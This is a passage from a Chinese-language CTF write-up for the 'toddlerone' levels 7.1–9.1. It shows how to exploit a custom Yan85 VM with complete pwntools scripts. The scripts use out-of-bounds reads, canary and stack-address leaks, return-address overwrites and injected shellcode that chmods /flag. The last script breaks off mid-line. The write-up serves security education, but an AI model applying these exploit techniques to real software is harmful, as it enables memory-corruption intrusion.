<p>有一个细节是<code>sys_open</code>被禁用了，也就是不希望我们直接通过它提供的指令将flag <code>write</code>出来。所以，我们需要用这些指令来劫持控制流。先简单把所有指令的作用以及用法记录一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 在.0情形下，使用以下API的用法。但关卡不同设置不同，因此输入的三字节到底以什么样的顺序被解析需要ida逆后分析</span><br><span class="hljs-comment"># imm</span><br><span class="hljs-comment"># usage: 0x&#123;reg_x&#125;&#123;opcode&#125;&#123;value&#125;</span><br><span class="hljs-comment"># reg_x = value</span><br><br><span class="hljs-comment"># sys</span><br><span class="hljs-comment"># usage: 0x&#123;sys_opcode&#125;&#123;opcode&#125;&#123;reg_x&#125;</span><br><span class="hljs-comment"># read_code: read(reg_a, &amp;buf[3 * reg_b], reg_c); result -&gt; reg_x</span><br><span class="hljs-comment"># read_memory: read(reg_a, &amp;buf[reg_b + 768], reg_c); result -&gt; reg_x</span><br><span class="hljs-comment"># sys_write: write(reg_a, &amp;buf[reg_b + 768], reg_c); result -&gt; reg_x</span><br><span class="hljs-comment"># sys_sleep: sleep(reg_a); result -&gt; reg_x</span><br><span class="hljs-comment"># sys_exit: exit(reg_a); result -&gt; reg_x </span><br><br><span class="hljs-comment"># add</span><br><span class="hljs-comment"># usage: 0x&#123;reg_x&#125;&#123;opcode&#125;&#123;reg_y&#125;</span><br><span class="hljs-comment"># reg_x = reg_x + reg_y</span><br><br><span class="hljs-comment"># stk</span><br><span class="hljs-comment"># usage: 0x&#123;arg1&#125;&#123;opcode&#125;&#123;arg2&#125;     --&gt; reg_s(栈顶指针)相应修改</span><br><span class="hljs-comment"># push: 0x&#123;00&#125;&#123;opcode&#125;&#123;reg_x&#125;   --&gt; push reg_x</span><br><span class="hljs-comment"># pop: 0x&#123;reg_x&#125;&#123;opcode&#125;&#123;00&#125;    --&gt; pop reg_x</span><br><br><span class="hljs-comment"># stm</span><br><span class="hljs-comment"># usage: 0x&#123;reg_x&#125;&#123;opcode&#125;&#123;reg_y&#125;   --&gt; buf[reg_x+768] = reg_y</span><br><br><span class="hljs-comment"># ldm</span><br><span class="hljs-comment"># usage: 0x&#123;reg_x&#125;&#123;opcode&#125;&#123;reg_y&#125;   --&gt; reg_x = buf[reg_y+768]</span><br><br><span class="hljs-comment"># cmp</span><br><span class="hljs-comment"># reg_f(标志位)根据比较的结果相应修改</span><br><span class="hljs-comment"># usage: 0x&#123;reg_x&#125;&#123;opcode&#125;&#123;reg_y&#125;   --&gt; cmp reg_x, reg_y</span><br><br><br></code></pre></td></tr></table></figure>

<p>这里可以发现buf划分出来的memory区在buf[768]开始的区域。 那么我们通过修改<code>reg_b</code>的值使其起始地址在<code>buf[255+768]=&gt; buf[1023]</code>，也就是buf的最后一个元素。然后再通过<code>reg_c</code>控制read读取的字节数，使其从<code>Yan85</code>设定的内存区域逃逸出来。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># usage: 0x&#123;opcode&#125;&#123;arg1&#125;&#123;arg2&#125;</span><br></code></pre></td></tr></table></figure>

<p>思路是：首先通过<code>read(0, &amp;buf, 0x27)</code>读取shellcode到<code>Yan85</code>的memory区，再通过<code>read(0,&amp;buf+1023, 0x21)</code>覆盖返回地址为<code>&amp;buf[768]</code>以执行shellcode。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>,terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>])<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack</span>(<span class="hljs-params">a1, opcode, a2</span>):<br>    <span class="hljs-comment"># 三字节顺序会变，因此这里只做pack。</span><br>    <span class="hljs-comment"># 但其实可以改pack，而不改下面给pack参数的顺序。</span><br>    <span class="hljs-keyword">return</span> p8(a2) + p16((a1&lt;&lt;<span class="hljs-number">8</span>) + opcode)           <span class="hljs-comment"># 注意小端序的pack方式</span><br><br><br><span class="hljs-comment"># p = gdb.debug(&quot;/tmp/toddlerone-level-7-1&quot;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/toddlerone-level-7-1&quot;</span>)<br><br><br>reg = &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-number">64</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">4</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">32</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-number">16</span>, <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;i&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-number">8</span>&#125;<br>opcode = &#123;<span class="hljs-string">&#x27;imm&#x27;</span>: <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;add&#x27;</span>: <span class="hljs-number">0x40</span>, <span class="hljs-string">&#x27;stk&#x27;</span>: <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;stm&#x27;</span>: <span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;ldm&#x27;</span>: <span class="hljs-number">0x08</span>, <span class="hljs-string">&#x27;cmp&#x27;</span>: <span class="hljs-number">0x01</span>, <span class="hljs-string">&#x27;jmp&#x27;</span>: <span class="hljs-number">0x02</span>, <span class="hljs-string">&#x27;sys&#x27;</span>: <span class="hljs-number">0x04</span>&#125;<br>sys_opcode = &#123;<span class="hljs-string">&#x27;open&#x27;</span>: <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;read_code&#x27;</span>: <span class="hljs-number">0x04</span>, <span class="hljs-string">&#x27;read_memory&#x27;</span>: <span class="hljs-number">0x02</span>, <span class="hljs-string">&#x27;write&#x27;</span>: <span class="hljs-number">0x01</span>, <span class="hljs-string">&#x27;sleep&#x27;</span>: <span class="hljs-number">0x08</span>, <span class="hljs-string">&#x27;exit&#x27;</span>: <span class="hljs-number">0x20</span>&#125;<br><br><span class="hljs-comment"># read shellcode</span><br>payload_yan = pack(opcode[<span class="hljs-string">&#x27;imm&#x27;</span>], <span class="hljs-number">0x00</span>, reg[<span class="hljs-string">&#x27;a&#x27;</span>])<br>payload_yan += pack(opcode[<span class="hljs-string">&#x27;imm&#x27;</span>], <span class="hljs-number">0x00</span>, reg[<span class="hljs-string">&#x27;b&#x27;</span>])<br>payload_yan += pack(opcode[<span class="hljs-string">&#x27;imm&#x27;</span>], <span class="hljs-number">0x27</span>, reg[<span class="hljs-string">&#x27;c&#x27;</span>])<br>payload_yan += pack(opcode[<span class="hljs-string">&#x27;sys&#x27;</span>], reg[<span class="hljs-string">&#x27;a&#x27;</span>], sys_opcode[<span class="hljs-string">&#x27;read_memory&#x27;</span>])<br><br><span class="hljs-comment"># read(0, &amp;buf+1023, 0x21)</span><br>payload_yan += pack(opcode[<span class="hljs-string">&#x27;imm&#x27;</span>], <span class="hljs-number">0x00</span>, reg[<span class="hljs-string">&#x27;a&#x27;</span>])<br>payload_yan += pack(opcode[<span class="hljs-string">&#x27;imm&#x27;</span>], <span class="hljs-number">0xFF</span>, reg[<span class="hljs-string">&#x27;b&#x27;</span>])<br>payload_yan += pack(opcode[<span class="hljs-string">&#x27;imm&#x27;</span>], <span class="hljs-number">0x21</span>, reg[<span class="hljs-string">&#x27;c&#x27;</span>])<br>payload_yan += pack(opcode[<span class="hljs-string">&#x27;sys&#x27;</span>], reg[<span class="hljs-string">&#x27;a&#x27;</span>], sys_opcode[<span class="hljs-string">&#x27;read_memory&#x27;</span>])<br><span class="hljs-comment"># exit</span><br>payload_yan += pack(opcode[<span class="hljs-string">&#x27;imm&#x27;</span>], <span class="hljs-number">0x00</span>, reg[<span class="hljs-string">&#x27;a&#x27;</span>])<br>payload_yan += pack(opcode[<span class="hljs-string">&#x27;sys&#x27;</span>], reg[<span class="hljs-string">&#x27;a&#x27;</span>], sys_opcode[<span class="hljs-string">&#x27;exit&#x27;</span>])<br>pause()<br>p.send(payload_yan)<br><br><span class="hljs-comment"># overwrite</span><br>shellcode = shellcraft.chmod(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0o777</span>)<br>binary_shellcode = asm(shellcode)<br><span class="hljs-comment"># print(len(binary_shellcode))  39</span><br>p.send(binary_shellcode + <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">17</span> + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(<span class="hljs-number">0x7fffffffddb0</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="level-8-1"><a href="#level-8-1" class="headerlink" title="level 8.1"></a>level 8.1</h1><p>这题开启了<code>ASLR</code>和<code>canary</code>，因此需要泄露<code>Canary</code>和<code>stack_addr</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># imm</span><br><span class="hljs-comment"># usage: 0x&#123;value&#125;&#123;opcode&#125;&#123;reg_x&#125;</span><br><span class="hljs-comment"># reg_x = value</span><br><br><span class="hljs-comment"># sys</span><br><span class="hljs-comment"># usage: 0x&#123;reg_x&#125;&#123;opcode&#125;&#123;sys_opcode&#125;</span><br></code></pre></td></tr></table></figure>

<p>canary好泄露，它在<code>rbp-0x8</code>的位置处。直接通过<code>write</code>泄露出来。但是<code>stack_addr</code>就需要通过gdb查看在调用<code>write</code>时当时stack的状态，然后找到栈上存储的栈地址。计算一下偏移地址即可得到shellcode的栈地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;info&quot;</span>,terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>])<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack</span>(<span class="hljs-params">a1, a2, a3</span>):<br>    <span class="hljs-comment"># 0x&#123;a1&#125;&#123;a2&#125;&#123;a3&#125;</span><br>    <span class="hljs-comment"># 由于顺序会变，三个参数的含义不同，所以pack仅做打包</span><br>    <span class="hljs-keyword">return</span> p8(a3) + p16((a1&lt;&lt;<span class="hljs-number">8</span>) + a2)           <span class="hljs-comment"># 注意小端序的pack方式</span><br><br><br><span class="hljs-comment"># p = gdb.debug(&quot;/tmp/toddlerone-level-8-1&quot;, &quot;b *$rebase(0x1C8E)&quot;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/toddlerone-level-8-1&quot;</span>)<br><br><br>reg = &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-number">4</span>, <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-number">64</span>, <span class="hljs-string">&#x27;i&#x27;</span>: <span class="hljs-number">16</span>, <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-number">32</span>&#125;<br>opcode = &#123;<span class="hljs-string">&#x27;imm&#x27;</span>: <span class="hljs-number">0x04</span>, <span class="hljs-string">&#x27;add&#x27;</span>: <span class="hljs-number">0x01</span>, <span class="hljs-string">&#x27;stk&#x27;</span>: <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;stm&#x27;</span>: <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;ldm&#x27;</span>: <span class="hljs-number">0x02</span>, <span class="hljs-string">&#x27;cmp&#x27;</span>: <span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;jmp&#x27;</span>: <span class="hljs-number">0x08</span>, <span class="hljs-string">&#x27;sys&#x27;</span>: <span class="hljs-number">0x40</span>&#125;<br>sys_opcode = &#123;<span class="hljs-string">&#x27;open&#x27;</span>: <span class="hljs-number">0x4</span>, <span class="hljs-string">&#x27;read_code&#x27;</span>: <span class="hljs-number">0x02</span>, <span class="hljs-string">&#x27;read_memory&#x27;</span>: <span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;write&#x27;</span>: <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;sleep&#x27;</span>: <span class="hljs-number">0x01</span>, <span class="hljs-string">&#x27;exit&#x27;</span>: <span class="hljs-number">0x08</span>&#125;<br><br><span class="hljs-comment"># leak stack_addr and canary</span><br>payload_yan = pack(<span class="hljs-number">0x01</span>, opcode[<span class="hljs-string">&quot;imm&quot;</span>], reg[<span class="hljs-string">&#x27;a&#x27;</span>])<br>payload_yan += pack(<span class="hljs-number">0xff</span>, opcode[<span class="hljs-string">&quot;imm&quot;</span>], reg[<span class="hljs-string">&#x27;b&#x27;</span>])<br>payload_yan += pack(<span class="hljs-number">0x31</span>, opcode[<span class="hljs-string">&quot;imm&quot;</span>], reg[<span class="hljs-string">&#x27;c&#x27;</span>])<br>payload_yan += pack(reg[<span class="hljs-string">&#x27;a&#x27;</span>], opcode[<span class="hljs-string">&quot;sys&quot;</span>], sys_opcode[<span class="hljs-string">&#x27;write&#x27;</span>])<br><span class="hljs-comment"># read shellcode</span><br>payload_yan += pack(<span class="hljs-number">0x00</span>, opcode[<span class="hljs-string">&#x27;imm&#x27;</span>], reg[<span class="hljs-string">&#x27;a&#x27;</span>])<br>payload_yan += pack(<span class="hljs-number">0x00</span>, opcode[<span class="hljs-string">&#x27;imm&#x27;</span>], reg[<span class="hljs-string">&#x27;b&#x27;</span>])<br>payload_yan += pack(<span class="hljs-number">0x27</span>, opcode[<span class="hljs-string">&#x27;imm&#x27;</span>], reg[<span class="hljs-string">&#x27;c&#x27;</span>])<br>payload_yan += pack(reg[<span class="hljs-string">&#x27;a&#x27;</span>], opcode[<span class="hljs-string">&#x27;sys&#x27;</span>], sys_opcode[<span class="hljs-string">&#x27;read_memory&#x27;</span>])<br><span class="hljs-comment"># # read(0, &amp;buf+1023, 0x21)</span><br>payload_yan += pack(<span class="hljs-number">0x00</span>, opcode[<span class="hljs-string">&#x27;imm&#x27;</span>], reg[<span class="hljs-string">&#x27;a&#x27;</span>])<br>payload_yan += pack(<span class="hljs-number">0xFF</span>, opcode[<span class="hljs-string">&#x27;imm&#x27;</span>], reg[<span class="hljs-string">&#x27;b&#x27;</span>])<br>payload_yan += pack(<span class="hljs-number">0x21</span>, opcode[<span class="hljs-string">&#x27;imm&#x27;</span>], reg[<span class="hljs-string">&#x27;c&#x27;</span>])<br>payload_yan += pack(reg[<span class="hljs-string">&#x27;a&#x27;</span>], opcode[<span class="hljs-string">&#x27;sys&#x27;</span>], sys_opcode[<span class="hljs-string">&#x27;read_memory&#x27;</span>])<br>payload_yan += pack(<span class="hljs-number">0x00</span>, opcode[<span class="hljs-string">&#x27;imm&#x27;</span>], reg[<span class="hljs-string">&#x27;a&#x27;</span>])<br>payload_yan += pack(reg[<span class="hljs-string">&#x27;a&#x27;</span>], opcode[<span class="hljs-string">&#x27;sys&#x27;</span>], sys_opcode[<span class="hljs-string">&#x27;exit&#x27;</span>])<br><span class="hljs-comment"># pause()</span><br>p.send(payload_yan)<br><br><span class="hljs-comment"># get canary and stack_addr</span><br>p.recvuntil(<span class="hljs-string">b&quot;Please input your yancode: &quot;</span>)<br>p.recv(<span class="hljs-number">9</span>)<br>canary = u64(p.recv(<span class="hljs-number">8</span>))<br>p.recv(<span class="hljs-number">24</span>)                     <br>stack_addr = u64(p.recv(<span class="hljs-number">8</span>))<br>shellcode_offset = <span class="hljs-number">0x208</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(stack_addr))<br>shellcode_addr = stack_addr - shellcode_offset<br><br><span class="hljs-comment"># overwrite </span><br>shellcode = shellcraft.chmod(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0o777</span>)<br>binary_shellcode = asm(shellcode)<br><span class="hljs-comment"># print(len(binary_shellcode))  39</span><br>p.send(binary_shellcode + <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">9</span> + p64(canary) + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(shellcode_addr))<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="level-9-1"><a href="#level-9-1" class="headerlink" title="level 9.1"></a>level 9.1</h1><p>限制<code>Yan85</code>代码中<code>sys</code>操作，只能使用一次<code>sys</code>操作。也就是说只能使用<code>Yan85</code>进行一次系统调用。这里发现从<code>&amp;buf[256]</code>开始接收输入。<strong>也就是说<code>memory</code>区和<code>yancode</code>区调换了位置</strong>。所以它相应的<code>read</code>和<code>write</code>等系统调用也会作相应修改。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">read(<span class="hljs-number">0</span>, &amp;v5[<span class="hljs-number">256</span>], <span class="hljs-number">0x300u</span>LL);<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># sys_open</span><br><span class="hljs-comment"># usage: open(&amp;buf[reg_a], reg_b)</span><br><br><span class="hljs-comment"># sys</span><br><span class="hljs-comment"># usage: 0x&#123;sys_opcode&#125;&#123;opcode&#125;&#123;reg_x&#125;</span><br><span class="hljs-comment"># read_memory: read(reg_a, &amp;buf[reg_b], reg_c); result -&gt; reg_x</span><br><span class="hljs-comment"># sys_write: write(reg_a, &amp;buf[reg_b], reg_c); result -&gt; reg_x</span><br><span class="hljs-comment"># sys_sleep: sleep(reg_a); result -&gt; reg_x</span><br><span class="hljs-comment"># sys_exit: exit(reg_a); result -&gt; reg_x </span><br></code></pre></td></tr></table></figure>

<p>看一下限制：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>&#123;<br>    <span class="hljs-keyword">if</span> ( (v5[<span class="hljs-number">3</span> * i + <span class="hljs-number">256</span>] &amp; <span class="hljs-number">0x20</span>) != <span class="hljs-number">0</span> )<br>        ++v3;<br>&#125;<br><span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">1</span> )<br>    __assert_fail(<span class="hljs-string">&quot;num_syscalls &lt;= 1&quot;</span>, <span class="hljs-string">&quot;/challenge/toddlerone-level-9-0.c&quot;</span>, <span class="hljs-number">0x1BAu</span>, <span class="hljs-string">&quot;main&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>在<code>yancode</code>区检查<code>opcode</code>，记录<code>sys</code>操作的次数。并且这个检查是在第一次输入后立即进行且没有二次检查的。<strong>有没有什么办法能够输入完buf后，又通过系统调用覆盖掉buf呢？</strong></p>
<p>思路：通过一次<code>read_memory</code>调用从<code>stdin</code>获取输入，这个输入是可以溢出的，溢出到<code>yancode</code>区。那么就可以覆盖第一次输入的<code>buf</code>。</p>
<p>为了让shellcode好写（因为需要用<code>yancode</code>构造shellcode，因此通过软链接(<code>ln -s</code>)将<code>flag</code>缩短为<code>f</code>）对<code>/flag</code>进行<em>重命名</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;info&quot;</span>,terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>])<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack</span>(<span class="hljs-params">a1, a2, a3</span>):<br>    <span class="hljs-comment"># 0x&#123;a1&#125;&#123;a2&#125;&#123;a3&#125;</span><br>    <span class="hljs-comment"># 由于顺序会变，三个参数的含义不同，所以pack仅做打包</span><br>    <span class="hljs-keyword">return</span> p8(a3) + p16((a1&lt;&lt;<span class="hljs-number">8</span>) + a2)           <span class="hljs-comment"># 注意小端序的pack方式</span><br><br><br><span class="hljs-comment"># p = gdb.debug(&quot;/tmp/toddlerone-level-9-1&quot;, &quot;b *$rebase(0x1E85)&quot;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/toddlerone-level-9-1&quot;</span>)<br><br>reg = &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-number">32</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">16</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-number">4</span>, <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;i&#x27;</span>: <span class="hljs-number">64</span>, <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-number">8</span>&#125;<br>opcode = &#123;<span class="hljs-string">&#x27;imm&#x27;</span>: <span class="hljs-number">0x04</span>, <span class="hljs-string">&#x27;add&#x27;</span>: <span class="hljs-number">0x08</span>, <span class="hljs-string">&#x27;stk&#x27;</span>: <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;stm&#x27;</span>: <span class="hljs-number">0x02</span>, <span class="hljs-string">&#x27;ldm&#x27;</span>: <span class="hljs-number">0x40</span>, <span class="hljs-string">&#x27;cmp&#x27;</span>: <span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;jmp&#x27;</span>: <span class="hljs-number">0x01</span>, <span class="hljs-string">&#x27;sys&#x27;</span>: <span class="hljs-number">0x10</span>&#125;<br>sys_opcode = &#123;<span class="hljs-string">&#x27;open&#x27;</span>: <span class="hljs-number">0x08</span>, <span class="hljs-string">&#x27;read_code&#x27;</span>: <span class="hljs-number">0x04</span>, <span class="hljs-string">&#x27;read_memory&#x27;</span>: <span class="hljs-number">0x01</span>, <span class="hljs-string">&#x27;write&#x27;</span>: <span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;sleep&#x27;</span>: <span class="hljs-number">0x02</span>, <span class="hljs-string">&#x27;exit&#x27;</span>: <span class="hljs-number">0x10</span>&#125;<br><br><span class="hljs-comment"># 0x&#123;value&#125;&#123;reg_x&#125;&#123;opcode&#125;</span><br><span class="hljs-comment"># 0x&#123;reg_x&#125;&#123;sys_opcode&#125;&#123;opcode&#125;</span><br><span class="hljs-comment"># open</span><br>shellcode = pack(<span class="hljs-number">0x66</span>, reg[<span class="hljs-string">&#x27;c&#x27;</span>], opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br>shellcode += pack(reg[<span class="hljs-string">&#x27;c&#x27;</span>], reg[<span class="hljs-string">&#x27;d&#x27;</span>], opcode[<span class="hljs-string">&#x27;stm&#x27;</span>])<br>shellcode += pack(<span class="hljs-number">0x00</span>, reg[<span class="hljs-string">&#x27;b&#x27;</span>], opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br>shellcode += pack(<span class="hljs-number">0x00</span>, reg[<span class="hljs-string">&#x27;a&#x27;</span>], opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br>shellcode += pack(reg[<span class="hljs-string">&#x27;a&#x27;</span>], sys_opcode[<span class="hljs-string">&#x27;open&#x27;</span>], opcode[<span class="hljs-string">&#x27;sys&#x27;</span>])<br><span class="hljs-comment"># read</span><br>shellcode += pack(reg[<span class="hljs-string">&#x27;c&#x27;</span>],sys_opcode[<span class="hljs-string">&#x27;read_memory&#x27;</span>],opcode[<span class="hljs-string">&#x27;sys&#x27;</span>])<br><span class="hljs-comment"># write</span><br>shellcode += pack(<span class="hljs-number">0x01</span>, reg[<span class="hljs-string">&#x27;a&#x27;</span>], opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br>shellcode += pack(reg[<span class="hljs-string">&#x27;a&#x27;</span>],sys_opcode[<span class="hljs-string">&#x27;write&#x27;</span>], opcode[<span class="hljs-string">&#x27;sys&#x27;</span>])<br><span class="hljs-comment"># exit</span><br>shellcode += pack(<span class="hljs-number">0x00</span>, reg[<span class="hljs-string">&#x27;a&#x27;</span>], opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br>shellcode += pack(reg[<span class="hljs-string">&#x27;a&#x27;</span>],sys_opcode[<span class="hljs-string">&#x27;exit&#x27;</span>], 